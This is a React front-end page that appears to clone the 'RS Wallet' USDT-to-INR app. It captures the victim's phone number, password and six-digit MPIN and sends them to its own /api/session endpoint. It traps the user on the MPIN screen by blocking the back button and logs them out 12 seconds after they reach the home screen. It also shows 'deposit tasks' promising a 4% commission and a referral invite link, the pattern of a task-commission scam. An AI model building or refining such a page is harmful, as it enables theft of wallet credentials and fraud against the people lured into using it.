'use client';

import { useCallback, useEffect, useRef, useState } from 'react';
import {
  BriefcaseBusiness,
  ChevronDown,
  ChevronRight,
  CircleDollarSign,
  CircleEllipsis,
  CirclePlay,
  Copy,
  Delete,
  House,
  Keyboard,
  UserRound,
  Users,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { AuthenticatorView, WalletHome, WalletLogin, WalletProfile, WalletNavIcon, type WalletScreen } from '@/components/wallet-views';
import { createDemoSecret } from '@/lib/demo-authenticator';
import { TelegramPopup } from '@/components/telegram-popup';
import { HomePosterPopup, MediaPopup } from '@/components/managed-media';
import { useSiteContent } from '@/hooks/use-site-content';

type Screen = WalletScreen;

const navItems = [
  { label: 'Home', icon: House, target: 'home' as const },
  { label: 'Deposit', icon: CircleDollarSign, target: 'deposit' as const },
  { label: 'UPI', icon: BriefcaseBusiness },
  { label: 'Team', icon: Users, target: 'team' as const },
  { label: 'Me', icon: CircleEllipsis, target: 'profile' as const },
];

export default function Home({ initialScreen = 'login' }: { initialScreen?: Screen }) {
  const [screen, setScreen] = useState<Screen>(initialScreen);
  const [authSecret, setAuthSecret] = useState('');
  const [authBound, setAuthBound] = useState(false);
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [pin, setPin] = useState('');
  const [notice, setNotice] = useState('');
  const [authBusy, setAuthBusy] = useState(false);
  const content = useSiteContent();
  const [dismissedTelegram, setDismissedTelegram] = useState('');
  const [dismissedMedia, setDismissedMedia] = useState('');
  const [dismissedPoster, setDismissedPoster] = useState('');
  const [depositUnavailable, setDepositUnavailable] = useState(false);
  const hiddenPinInput = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (pin.length !== 6 || screen !== 'mpin') return;
    const timer = window.setTimeout(async () => {
      setAuthBusy(true);
      try {
        const response = await fetch('/api/session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ step: 'mpin', pin }) });
        const result = await response.json() as { error?: string };
        if (!response.ok) throw new Error(result.error || 'Unable to verify this demo session.');
        setPassword('');
        setPin('');
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('rswallet_phase', 'home');
        }
        setAuthBusy(false);
        setScreen('home');
      } catch (error) { setNotice((error as Error).message); setPin(''); setAuthBusy(false); }
    }, 300);
    return () => window.clearTimeout(timer);
  }, [pin, screen]);

  // Prevent back button on MPIN screen
  useEffect(() => {
    if (screen !== 'mpin') return;
    window.history.pushState(null, '', window.location.href);
    const preventBack = () => {
      window.history.pushState(null, '', window.location.href);
    };
    window.addEventListener('popstate', preventBack);
    return () => window.removeEventListener('popstate', preventBack);
  }, [screen]);

  // Session & screen lifecycle on mount:
  // 1. If user refreshed on MPIN, keep them on MPIN.
  // 2. If user refreshed on Home, kick them back to login page.
  useEffect(() => {
    const initSession = async () => {
      const savedPhase = typeof window !== 'undefined' ? sessionStorage.getItem('rswallet_phase') : null;

      try {
        const response = await fetch('/api/session', { cache: 'no-store' });
        if (response.ok) {
          const result = await response.json() as { authenticated: boolean; phase: string };
          if (result.phase === 'mpin' || savedPhase === 'mpin') {
            setScreen('mpin');
            if (typeof window !== 'undefined') {
              sessionStorage.setItem('rswallet_phase', 'mpin');
            }
            window.setTimeout(() => hiddenPinInput.current?.focus(), 100);
            return;
          }
        }
      } catch {}

      if (savedPhase === 'home' || initialScreen === 'home') {
        if (typeof window !== 'undefined') {
          sessionStorage.removeItem('rswallet_phase');
        }
        void fetch('/api/session', { method: 'DELETE' }).catch(() => {});
        setScreen('login');
        window.history.replaceState(null, '', '/login');
        return;
      }
    };
    void initSession();
  }, [initialScreen]);

  useEffect(() => {
    if (!notice) return;
    const timer = window.setTimeout(() => setNotice(''), 1900);
    return () => window.clearTimeout(timer);
  }, [notice]);

  const addDigit = (digit: string) => {
    if (authBusy) return;
    setPin((current) => (current.length < 6 ? `${current}${digit}` : current));
  };

  const openMpin = async (event: React.FormEvent) => {
    event.preventDefault();
    if (authBusy) return;
    setAuthBusy(true);
    try {
      const response = await fetch('/api/session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ step: 'begin', phone, password }) });
      const result = await response.json() as { error?: string };
      if (!response.ok) throw new Error(result.error || 'Unable to start login.');
      setPin('');
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('rswallet_phase', 'mpin');
      }
      setScreen('mpin');
      window.setTimeout(() => hiddenPinInput.current?.focus(), 80);
    } catch (error) { setNotice((error as Error).message); }
    finally { setAuthBusy(false); }
  };

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'instant' });
    const isLogin = screen === 'login' || screen === 'mpin';
    const path = isLogin ? '/login' : '/home';
    const hash = !isLogin && screen !== 'home' ? '#' + screen : '';
    window.history.replaceState(null, '', path + hash);
    document.title = isLogin ? 'RS Wallet Login | RS Wallet App Download & USDT Deposit' : screen === 'home' ? 'RS Wallet Home | USDT to INR' : 'RS Wallet — ' + screen.charAt(0).toUpperCase() + screen.slice(1);
  }, [screen]);

  const navigate = (next: Screen) => {
    if (next === 'authenticator' && !authSecret && !authBound) setAuthSecret(createDemoSecret());
    setNotice('');
    if (next !== 'deposit') setDepositUnavailable(false);
    setScreen(next);
  };

  const logout = useCallback(async () => {
    try {
      await fetch('/api/session', { method: 'DELETE' });
    } catch {}
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('rswallet_phase');
    }
    setPhone('');
    setPassword('');
    setPin('');
    setAuthSecret('');
    setAuthBound(false);
    setNotice('');
    setDismissedTelegram('');
    setDismissedMedia('');
    setDismissedPoster('');
    setDepositUnavailable(false);
    setScreen('login');
    window.history.replaceState(null, '', '/login');
  }, []);

  useEffect(() => {
    if (screen === 'login' || screen === 'mpin') return;
    const checkSession = async () => {
      try {
        const response = await fetch('/api/session', { cache: 'no-store' });
        if (response.ok && !(await response.json() as { authenticated: boolean }).authenticated) {
          if (typeof window !== 'undefined') sessionStorage.removeItem('rswallet_phase');
          setScreen('login');
          window.history.replaceState(null, '', '/login');
        }
      } catch { /* A temporary disconnect should not discard the session. */ }
    };
    const timer = window.setInterval(() => { void checkSession(); }, 30_000);
    // 12-second auto logout on home
    const autoLogout = window.setTimeout(() => { void logout(); }, 12_000);
    window.addEventListener('focus', checkSession);
    window.addEventListener('pageshow', checkSession);
    return () => { window.clearInterval(timer); window.clearTimeout(autoLogout); window.removeEventListener('focus', checkSession); window.removeEventListener('pageshow', checkSession); };
  }, [screen, logout]);

  const showComingSoon = (label: string) => {
    // Disabled as requested
  };

  const telegramKey = JSON.stringify([content.presentationVersions?.telegram ?? 0, content.telegram]);
  const mediaKey = JSON.stringify([content.presentationVersions?.popup ?? 0, content.popup]);
  const posterKey = JSON.stringify([content.presentationVersions?.homeBanner ?? 0, content.homeBanner]);
  const posterOpen = screen === 'home' && content.homeBanner.enabled && !!content.homeBanner.asset && dismissedPoster !== posterKey && !depositUnavailable;
  const telegramOpen = screen === 'home' && content.telegram.enabled && !!content.telegram.url && dismissedTelegram !== telegramKey && !depositUnavailable && !posterOpen;
  const mediaOpen = screen === 'home' && content.popup.enabled && !!content.popup.asset && dismissedMedia !== mediaKey && !telegramOpen && !posterOpen && !depositUnavailable;
  useEffect(() => { if (!content.telegram.enabled) setDismissedTelegram(''); }, [content.telegram.enabled]);
  useEffect(() => { if (!content.popup.enabled) setDismissedMedia(''); }, [content.popup.enabled]);
  useEffect(() => { if (!content.homeBanner.enabled) setDismissedPoster(''); }, [content.homeBanner.enabled]);

  return (
    <main className="min-h-dvh bg-[#ededed] sm:grid sm:place-items-start sm:py-6">
      <section className="wallet-shell relative mx-auto min-h-dvh w-full max-w-[430px] bg-white shadow-[0_12px_48px_rgba(0,0,0,.10)] sm:min-h-[calc(100dvh-48px)] sm:rounded-[16px]">
        {(screen === 'login' || screen === 'mpin') && (
          <WalletLogin
            phone={phone}
            setPhone={setPhone}
            password={password}
            setPassword={setPassword}
            onSubmit={openMpin}
            muted={screen === 'mpin'}
            busy={authBusy}
            showNotice={setNotice}
          />
        )}

        {screen === 'mpin' && (
          <div className="mpin-overlay fixed inset-y-0 left-1/2 z-50 flex w-full max-w-[430px] -translate-x-1/2 items-end bg-white/22 backdrop-blur-[1.5px]" role="dialog" aria-modal="true" aria-label="Please enter MPIN verification">
            <section className="w-full rounded-t-[20px] bg-white px-4 pb-[max(16px,env(safe-area-inset-bottom))] pt-5 shadow-[0_-8px_24px_rgba(0,0,0,.08)]">
              <h2 className="text-center text-[15px] font-semibold text-[#555]">{authBusy ? 'Verifying…' : 'Please enter MPIN verification'}</h2>

              <button
                type="button"
                aria-label="Enter six digit MPIN"
                className="mt-5 grid w-full grid-cols-6 gap-2"
                onClick={() => hiddenPinInput.current?.focus()}
              >
                {Array.from({ length: 6 }).map((_, index) => (
                  <span
                    key={index}
                    className={`grid aspect-square place-items-center rounded-[5px] bg-[#f8f8f8] text-[20px] font-semibold text-black ${index === pin.length ? 'ring-1 ring-black/15' : ''}`}
                  >
                    {pin[index] ?? (index === pin.length ? <span className="pin-caret" /> : '')}
                  </span>
                ))}
              </button>
              <input
                ref={hiddenPinInput}
                className="pointer-events-none absolute size-px opacity-0"
                inputMode="none"
                autoComplete="one-time-code"
                aria-label="MPIN"
                disabled={authBusy}
                value={pin}
                onChange={(event) => setPin(event.target.value.replace(/\D/g, '').slice(0, 6))}
              />

              <div className="mt-7 grid grid-cols-3 gap-2">
                {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((digit) => (
                  <button
                    key={digit}
                    type="button"
                    className="h-[48px] rounded-[8px] bg-[#f7f7f7] text-[27px] font-normal text-[#555] transition active:scale-[.98] active:bg-[#eeeeee]"
                    onClick={() => addDigit(String(digit))}
                  >
                    {digit}
                  </button>
                ))}
                <button
                  type="button"
                  aria-label="Open device keyboard"
                  className="grid h-[48px] place-items-center rounded-[8px] bg-[#f7f7f7] text-[#555]"
                  onClick={() => { if (hiddenPinInput.current) { hiddenPinInput.current.inputMode = 'numeric'; hiddenPinInput.current.focus(); } }}
                >
                  <Keyboard className="size-6" strokeWidth={1.7} />
                </button>
                <button
                  type="button"
                  className="h-[48px] rounded-[8px] bg-[#f7f7f7] text-[27px] font-normal text-[#555] transition active:scale-[.98] active:bg-[#eeeeee]"
                  onClick={() => addDigit('0')}
                >
                  0
                </button>
                <button
                  type="button"
                  aria-label="Delete last digit"
                  className="grid h-[48px] place-items-center rounded-[8px] bg-[#f7f7f7] text-[#555] transition active:scale-[.98] active:bg-[#eeeeee]"
                  disabled={authBusy}
                  onClick={() => setPin((current) => current.slice(0, -1))}
                >
                  <Delete className="size-6" strokeWidth={1.7} />
                </button>
              </div>
            </section>
          </div>
        )}

        {screen === 'home' && <WalletHome content={content} showComingSoon={showComingSoon} footer={<BottomNav active="home" navigate={navigate} showComingSoon={showComingSoon} />} />}

        {screen === 'deposit' && (
          <DepositView navigate={navigate} showComingSoon={showComingSoon} onBuy={() => setDepositUnavailable(true)} buying={depositUnavailable} />
        )}

        {screen === 'team' && (
          <TeamView navigate={navigate} showComingSoon={showComingSoon} />
        )}

        {screen === 'profile' && <WalletProfile content={content} navigate={navigate} logout={logout} showComingSoon={showComingSoon} footer={<BottomNav active="profile" navigate={navigate} showComingSoon={showComingSoon} />} />}
        {screen === 'authenticator' && <AuthenticatorView secret={authSecret} bound={authBound} onBound={() => { setAuthBound(true); setAuthSecret(''); }} onBack={() => navigate('profile')} showNotice={setNotice} />}

        <HomePosterPopup open={posterOpen} onOpenChange={open => { if (!open) setDismissedPoster(posterKey); }} asset={content.homeBanner.asset} />
        <TelegramPopup open={telegramOpen} onOpenChange={open => { if (!open) setDismissedTelegram(telegramKey); }} title={content.telegram.title} message={content.telegram.message} url={content.telegram.url} />
        <MediaPopup open={mediaOpen} onOpenChange={open => { if (!open) setDismissedMedia(mediaKey); }} asset={content.popup.asset} title={content.popup.title} />

        {/* Removed depositUnavailable message as requested */}
        {notice && (
          <div role="status" className="fixed bottom-[78px] left-1/2 z-50 -translate-x-1/2 whitespace-nowrap rounded-full bg-black px-4 py-2 text-xs font-medium text-white shadow-lg">
            {notice}
          </div>
        )}
      </section>
    </main>
  );
}

const depositTasks = [
  { amount: '30000 INR', income: '1200 (4%)', quota: '+31200' },
  { amount: '30000 INR', income: '1200 (4%)', quota: '+31200' },
  { amount: '30000 INR', income: '1200 (4%)', quota: '+31200' },
  { amount: '19000 INR', income: '760 (4%)', quota: '+19760' },
  { amount: '18999.05 INR', income: '759.96 (4%)', quota: '+19759.01' },
];

function DepositView({
  navigate,
  showComingSoon,
  onBuy,
  buying,
}: {
  navigate: (screen: Screen) => void;
  showComingSoon: (label: string) => void;
  onBuy: () => void;
  buying: boolean;
}) {
  return (
    <div className="min-h-dvh bg-white pb-[76px] sm:min-h-[calc(100dvh-48px)]">
      <div className="border-b border-[#eeeeee] px-[18px] pt-[26px]">
        <div className="flex gap-8 pb-[17px]">
          <button type="button" className="text-[16px] font-bold text-black">INR</button>
          <button type="button" className="text-[16px] font-semibold text-[#9b9b9b]" onClick={() => showComingSoon('USDT')}>USDT</button>
        </div>
      </div>

      <div className="px-[18px] pt-[21px]">
        <div className="flex gap-8 border-b border-[#eeeeee] pb-[15px]">
          <button type="button" className="text-[16px] font-bold text-black">Task</button>
          <button type="button" className="text-[16px] font-semibold text-[#9b9b9b]" onClick={() => showComingSoon('VIP')}>VIP</button>
        </div>

        <div className="mx-[14px] mt-[6px] flex h-[44px] items-center rounded-[6px] bg-[#e7e3ff] px-4">
          <span className="mr-2 grid size-[22px] shrink-0 place-items-center rounded-full bg-[#ffe666] text-[#d5ad30]">
            <CircleDollarSign className="size-[17px]" strokeWidth={2} />
          </span>
          <p className="text-[13px] font-semibold tracking-[-0.015em]">Complete a task to earn Commission and Bonus</p>
        </div>

        <button type="button" className="mt-[8px] flex items-center gap-2.5 text-[15px] font-semibold" onClick={() => showComingSoon('How Buy Quota?')}>
          <CirclePlay className="size-[18px] text-[#4d5565]" strokeWidth={2.2} />
          How Buy Quota?
        </button>

        <div className="mt-[21px] flex items-center gap-[7px]">
          <button type="button" className="flex h-[36px] min-w-0 flex-1 items-center justify-between rounded-[6px] bg-[#f7f7f7] px-4 text-left text-[14px] font-medium" onClick={() => showComingSoon('Sort')}>
            <span>From high to low</span>
            <ChevronDown className="size-4 text-[#dadada]" />
          </button>
          <button type="button" className="h-[36px] w-[58px] rounded-[6px] bg-[#f7f7f7] text-[13px] font-semibold text-[#a4a4ad]" onClick={() => showComingSoon('Minimum')}>Min</button>
          <span className="text-[14px] font-bold">−</span>
          <button type="button" className="h-[36px] w-[58px] rounded-[6px] bg-[#f7f7f7] text-[13px] font-semibold text-[#a4a4ad]" onClick={() => showComingSoon('Maximum')}>Max</button>
          <button type="button" className="h-[38px] w-[76px] rounded-[9px] bg-black text-[14px] font-medium text-white" onClick={() => showComingSoon('Refresh')}>Refresh</button>
        </div>

        <section className="mt-[10px]">
          {depositTasks.map((task, index) => (
            <article key={`${task.amount}-${index}`} className="flex min-h-[91px] items-center">
              <div className="min-w-0 flex-1">
                <h2 className="text-[19px] font-bold tracking-[-0.02em]">{task.amount}</h2>
                <div className="mt-[6px] flex gap-[27px]">
                  <div>
                    <p className="text-[13px] font-medium text-[#9c9c9c]">Income</p>
                    <p className="mt-0.5 text-[13px] font-medium">{task.income}</p>
                  </div>
                  <div>
                    <p className="text-[13px] font-medium text-[#9c9c9c]">Quota</p>
                    <p className="mt-0.5 text-[13px] font-medium text-[#22c4ba]">{task.quota}</p>
                  </div>
                </div>
              </div>
              <button type="button" className="h-[38px] w-[69px] rounded-[10px] bg-black text-[15px] font-medium text-white disabled:opacity-70" disabled={buying} onClick={onBuy}>Buy</button>
            </article>
          ))}
        </section>
      </div>

      <BottomNav active="deposit" navigate={navigate} showComingSoon={showComingSoon} />
    </div>
  );
}

const teamMembers = [
  '765****5831',
  '988****5831',
];

function TeamView({
  navigate,
  showComingSoon,
}: {
  navigate: (screen: Screen) => void;
  showComingSoon: (label: string) => void;
}) {
  const inviteUrl = 'https://enguinpay-app.com/regist?code=0eqshowpci3x';

  const copyInvite = async () => {
    try {
      await navigator.clipboard.writeText(inviteUrl);
      showComingSoon('Invite code copied');
    } catch {
      showComingSoon('Copy invite code');
    }
  };

  return (
    <div className="min-h-dvh bg-white pb-[76px] sm:min-h-[calc(100dvh-48px)]">
      <div className="px-[18px] pb-6 pt-[26px]">
        <h1 className="text-[22px] font-bold tracking-[-0.02em]">Team</h1>

        <section className="mt-[17px] h-[202px] rounded-[9px] bg-[#454545] px-[24px] py-[31px] text-white">
          <div className="grid grid-cols-2 gap-6">
            <div>
              <p className="text-[34px] font-normal leading-none">0</p>
              <p className="mt-[15px] text-[15px] font-medium">Commission</p>
            </div>
            <div>
              <p className="text-[34px] font-normal leading-none">0</p>
              <p className="mt-[15px] text-[15px] font-medium">Team Recharge</p>
            </div>
          </div>
          <div className="mt-[66px] flex items-center gap-1.5">
            <UserRound className="size-[20px]" strokeWidth={2} />
            <span className="text-[17px]">2</span>
          </div>
        </section>

        <h2 className="mt-[35px] text-[18px] font-bold">Invite Code</h2>
        <button type="button" className="mt-[14px] flex h-[61px] w-full items-center rounded-[10px] border border-[#ededed] px-[20px] text-left" onClick={copyInvite}>
          <span className="min-w-0 flex-1 truncate text-[13px] font-semibold">...enguinpay-app.com/regist?code=0eqshowpci3x</span>
          <span className="ml-2 grid size-[35px] shrink-0 place-items-center rounded-[5px] border border-[#f0f0f0]">
            <Copy className="size-[20px] text-[#555]" strokeWidth={2.2} />
          </span>
        </button>

        <h2 className="mt-[36px] text-[18px] font-bold">Team Detail</h2>
        <section className="mt-[25px]">
          {teamMembers.map((phone, index) => (
            <article key={phone} className="flex min-h-[91px] items-center border-b border-[#eeeeee] last:border-b-0">
              <div className="relative mr-[12px] size-[56px] shrink-0 overflow-hidden rounded-full bg-[#062f35]">
                <img src="/rswallet-team.jpeg" alt="" className={`absolute left-[-18px] w-[430px] max-w-none ${index === 0 ? 'top-[-496px]' : 'top-[-586px]'}`} />
              </div>
              <div className="min-w-0 flex-1">
                <p className="text-[14px] font-bold">Phone: {phone}</p>
                <p className="mt-[9px] text-[13px] font-medium text-[#999]">Recharge: 0</p>
              </div>
              <div className="ml-2 text-right text-[#999]">
                <p className="flex items-center justify-end gap-1 text-[14px]"><UserRound className="size-[17px]" />0</p>
                <p className="mt-[9px] text-[13px] font-medium">Comm: 0</p>
              </div>
            </article>
          ))}
        </section>
      </div>

      <BottomNav active="team" navigate={navigate} showComingSoon={showComingSoon} />
    </div>
  );
}

function BottomNav({
  active,
  navigate,
  showComingSoon,
}: {
  active: 'home' | 'deposit' | 'team' | 'profile';
  navigate: (screen: Screen) => void;
  showComingSoon: (label: string) => void;
}) {
  return (
    <nav aria-label="Main navigation" className="wallet-nav fixed bottom-0 left-1/2 z-40 grid w-full max-w-[430px] -translate-x-1/2 grid-cols-5 border-t border-[#ececec] bg-white">
      {navItems.map(({ label, target }) => {
        const isActive =
          (label === 'Home' && active === 'home') ||
          (label === 'Deposit' && active === 'deposit') ||
          (label === 'Team' && active === 'team') ||
          (label === 'Me' && active === 'profile');
        return (
          <button
            key={label}
            type="button"
            className={`wallet-nav-item flex touch-manipulation flex-col items-center justify-center ${isActive ? 'text-black' : 'text-[#969696]'}`}
            aria-current={isActive ? 'page' : undefined}
            onClick={() => (target ? navigate(target) : showComingSoon(label))}
          >
            <WalletNavIcon name={label} />
            <span className={isActive ? 'font-medium' : ''}>{label}</span>
          </button>
        );
      })}
    </nav>
  );
}
